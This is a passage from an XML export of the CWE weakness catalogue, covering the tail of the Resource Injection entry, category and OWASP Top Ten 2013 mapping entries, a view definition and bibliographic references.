            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
            <Note Type="Other">
               <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ol>
                     <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                     <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
                  </xhtml:ol>
               </xhtml:div>
               <xhtml:p>Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in a separate category. See the path manipulation description for further details of this vulnerability.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Maintenance_Notes, Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Resource Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of Resource Identifiers (aka 'Resource Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
</Weaknesses>
   <Categories>
      <Category ID="16" Name="Configuration" Status="Draft">
         <Summary>Weaknesses in this category are typically introduced during the configuration of the software.</Summary>
         <Relationships>
            <Has_Member CWE_ID="4" View_ID="699"/>
            <Has_Member CWE_ID="519" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>14</Entry_ID>
               <Entry_Name>Server Misconfiguration</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>15</Entry_ID>
               <Entry_Name>Application Misconfiguration</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Maintenance">This entry is a Category, but various sources map to it anyway, e.g. by NVD, despite CWE guidance that Categories should not be mapped. In this case, there are no clear CWE Weaknesses that can be utilized. "Inappropriate Configuration" might be better described as a Weakness, so this entry might be converted to a Weakness in a later version. Further research is required, however, as a "configuration weakness" might be Primary to many other CWEs, i.e., it might be better described in terms of chaining relationships.</Note>
         </Notes>
         <Content_History>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="2" Name="7PK - Environment" Status="Draft">
         <Summary>This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that are typically introduced during unexpected environmental conditions. According to the authors of the Seven Pernicious Kingdoms, "This section includes everything that is outside of the source code but is still critical to the security of the product that is being created. Because the issues covered by this kingdom are not directly related to source code, we separated it from the rest of the kingdoms."</Summary>
         <Relationships>
            <Has_Member CWE_ID="11" View_ID="700"/>
            <Has_Member CWE_ID="12" View_ID="700"/>
            <Has_Member CWE_ID="13" View_ID="700"/>
            <Has_Member CWE_ID="14" View_ID="700"/>
            <Has_Member CWE_ID="435" View_ID="1003"/>
            <Has_Member CWE_ID="5" View_ID="700"/>
            <Has_Member CWE_ID="6" View_ID="700"/>
            <Has_Member CWE_ID="7" View_ID="700"/>
            <Has_Member CWE_ID="8" View_ID="700"/>
            <Has_Member CWE_ID="9" View_ID="700"/>
         </Relationships>
         <Content_History>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-11-08">Environment</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="310" Name="Cryptographic Issues" Status="Draft">
         <Summary>Weaknesses in this category are related to the use of cryptography.</Summary>
         <Relationships>
            <Has_Member CWE_ID="295" View_ID="699"/>
            <Has_Member CWE_ID="311" View_ID="699"/>
            <Has_Member CWE_ID="320" View_ID="699"/>
            <Has_Member CWE_ID="320" View_ID="1003"/>
            <Has_Member CWE_ID="325" View_ID="699"/>
            <Has_Member CWE_ID="326" View_ID="699"/>
            <Has_Member CWE_ID="326" View_ID="1003"/>
            <Has_Member CWE_ID="327" View_ID="699"/>
            <Has_Member CWE_ID="327" View_ID="1003"/>
            <Has_Member CWE_ID="328" View_ID="699"/>
            <Has_Member CWE_ID="329" View_ID="699"/>
            <Has_Member CWE_ID="347" View_ID="699"/>
            <Has_Member CWE_ID="780" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cryptographic Issues</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;259"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This category is incomplete and needs refinement, as there is good documentation of cryptographic flaws and related attacks.</Note>
            <Note Type="Maintenance">Relationships between CWE-310, CWE-326, and CWE-327 and all their children need to be reviewed and reorganized.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas, References, Related_Attack_Patterns, Relationship_Notes</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="320" Name="Key Management Errors" Status="Draft">
         <Summary>Weaknesses in this category are related to errors in the management of cryptographic keys.</Summary>
         <Relationships>
            <Has_Member CWE_ID="321" View_ID="699"/>
            <Has_Member CWE_ID="322" View_ID="699"/>
            <Has_Member CWE_ID="323" View_ID="699"/>
            <Has_Member CWE_ID="324" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Key Management Errors</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Maintenance">This category should probably be split into multiple sub-categories.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Observed_Examples</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="929" Name="OWASP Top Ten 2013 Category A1 - Injection" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="77" View_ID="928"/>
            <Has_Member CWE_ID="78" View_ID="928"/>
            <Has_Member CWE_ID="88" View_ID="928"/>
            <Has_Member CWE_ID="89" View_ID="928"/>
            <Has_Member CWE_ID="90" View_ID="928"/>
            <Has_Member CWE_ID="91" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-927"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="930" Name="OWASP Top Ten 2013 Category A2 - Broken Authentication and Session Management" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="256" View_ID="928"/>
            <Has_Member CWE_ID="287" View_ID="928"/>
            <Has_Member CWE_ID="311" View_ID="928"/>
            <Has_Member CWE_ID="319" View_ID="928"/>
            <Has_Member CWE_ID="384" View_ID="928"/>
            <Has_Member CWE_ID="522" View_ID="928"/>
            <Has_Member CWE_ID="523" View_ID="928"/>
            <Has_Member CWE_ID="613" View_ID="928"/>
            <Has_Member CWE_ID="620" View_ID="928"/>
            <Has_Member CWE_ID="640" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-929"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-17</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="931" Name="OWASP Top Ten 2013 Category A3 - Cross-Site Scripting (XSS)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="79" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-930"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
      <Category ID="932" Name="OWASP Top Ten 2013 Category A4 - Insecure Direct Object References" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="22" View_ID="928"/>
            <Has_Member CWE_ID="639" View_ID="928"/>
            <Has_Member CWE_ID="99" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-931"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="933" Name="OWASP Top Ten 2013 Category A5 - Security Misconfiguration" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="16" View_ID="928"/>
            <Has_Member CWE_ID="2" View_ID="928"/>
            <Has_Member CWE_ID="209" View_ID="928"/>
            <Has_Member CWE_ID="215" View_ID="928"/>
            <Has_Member CWE_ID="548" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-932"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="934" Name="OWASP Top Ten 2013 Category A6 - Sensitive Data Exposure" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="310" View_ID="928"/>
            <Has_Member CWE_ID="311" View_ID="928"/>
            <Has_Member CWE_ID="312" View_ID="928"/>
            <Has_Member CWE_ID="319" View_ID="928"/>
            <Has_Member CWE_ID="320" View_ID="928"/>
            <Has_Member CWE_ID="325" View_ID="928"/>
            <Has_Member CWE_ID="326" View_ID="928"/>
            <Has_Member CWE_ID="327" View_ID="928"/>
            <Has_Member CWE_ID="328" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-933"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="935" Name="OWASP Top Ten 2013 Category A7 - Missing Function Level Access Control" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="285" View_ID="928"/>
            <Has_Member CWE_ID="287" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-934"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="936" Name="OWASP Top Ten 2013 Category A8 - Cross-Site Request Forgery (CSRF)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="352" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-935"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
      <Category ID="937" Name="OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.</Summary>
         <References>
            <Reference External_Reference_ID="REF-936"/>
         </References>
         <Notes>
            <Note Type="Relationship">This is an unusual category. CWE does not cover the limitations of human processes and procedures that cannot be described in terms of a specific technical weakness as resident in the code, architecture, or configuration of the software. Since "known vulnerabilities" can arise from any kind of weakness, it is not possible to map this OWASP category to other CWE entries, since it would effectively require mapping this category to ALL weaknesses.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
      <Category ID="938" Name="OWASP Top Ten 2013 Category A10 - Unvalidated Redirects and Forwards" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2013.</Summary>
         <Relationships>
            <Has_Member CWE_ID="601" View_ID="928"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-937"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
         </Content_History>
      </Category>
</Categories>
   <Views>
      <View ID="928" Name="Weaknesses in OWASP Top Ten (2013)" Type="Graph" Status="Incomplete">
         <Objective>CWE nodes in this view (graph) are associated with the OWASP Top Ten, as released in 2013.</Objective>
         <Audience>
            <Stakeholder>
               <Type>Software Developers</Type>
               <Description>This view outlines the most important issues as identified by the OWASP Top Ten (2013 version), providing a good starting point for web application developers who want to code more securely.</Description>
            </Stakeholder>
            <Stakeholder>
               <Type>Software Customers</Type>
               <Description>This view outlines the most important issues as identified by the OWASP Top Ten (2013 version), providing customers with a way of asking their software developers to follow minimum expectations for secure code.</Description>
            </Stakeholder>
            <Stakeholder>
               <Type>Educators</Type>
               <Description>Since the OWASP Top Ten covers the most frequently encountered issues, this view can be used by educators as training material for students.</Description>
            </Stakeholder>
         </Audience>
         <Members>
            <Has_Member CWE_ID="929" View_ID="928"/>
            <Has_Member CWE_ID="930" View_ID="928"/>
            <Has_Member CWE_ID="931" View_ID="928"/>
            <Has_Member CWE_ID="932" View_ID="928"/>
            <Has_Member CWE_ID="933" View_ID="928"/>
            <Has_Member CWE_ID="934" View_ID="928"/>
            <Has_Member CWE_ID="935" View_ID="928"/>
            <Has_Member CWE_ID="936" View_ID="928"/>
            <Has_Member CWE_ID="937" View_ID="928"/>
            <Has_Member CWE_ID="938" View_ID="928"/>
         </Members>
         <References>
            <Reference External_Reference_ID="REF-926"/>
         </References>
         <Notes>
            <Note Type="Relationship">The relationships in this view are a direct extraction of the CWE mappings that are in the 2013 OWASP document. CWE has changed since the release of that document.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </View>
</Views>
   <External_References>
      <External_Reference Reference_ID="REF-112">
         <Author>Michael Howard</Author>
         <Author>David LeBlanc</Author>
         <Title>Writing Secure Code</Title>
         <Edition>2nd Edition</Edition>
         <Publication_Year>2002</Publication_Year>
         <Publisher>Microsoft</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-140">
         <Author>Greg Hoglund</Author>
         <Author>Gary McGraw</Author>
         <Title>Exploiting Software: How to Break Code</Title>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---27</Publication_Day>
         <Publisher>Addison-Wesley</Publisher>
         <URL>https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-172">
         <Author>Chris Wysopal</Author>
         <Title>Mobile App Top 10 List</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---13</Publication_Day>
         <URL>http://www.veracode.com/blog/2010/12/mobile-app-top-10-list/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-174">
         <Author>Web Application Security Consortium</Author>
         <Title>Information Leakage</Title>
         <URL>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-175">
         <Author>Brian Chess</Author>
         <Author>Jacob West</Author>
         <Title>Secure Programming with Static Analysis</Title>
         <Publication_Year>2007</Publication_Year>
         <Publisher>Addison-Wesley</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-176">
         <Author>Michael Howard</Author>
         <Author>David LeBlanc</Author>
         <Title>Writing Secure Code</Title>
         <Edition>1st Edition</Edition>
         <Publication_Year>2001</Publication_Year>
         <Publication_Month>--11</Publication_Month>
         <Publication_Day>---13</Publication_Day>
         <Publisher>Microsoft Press</Publisher>
         <URL>https://www.microsoft.com/mspress/books/5612.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-179">
         <Author>Johannes Ullrich</Author>
         <Title>Top 25 Series - Rank 16 - Information Exposure Through an Error Message</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---17</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-185">
         <Author>OWASP</Author>
         <Title>Testing for Path Traversal (OWASP-AZ-001)</Title>
         <URL>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-186">
         <Author>Johannes Ullrich</Author>
         <Title>Top 25 Series - Rank 7 - Path Traversal</Title>
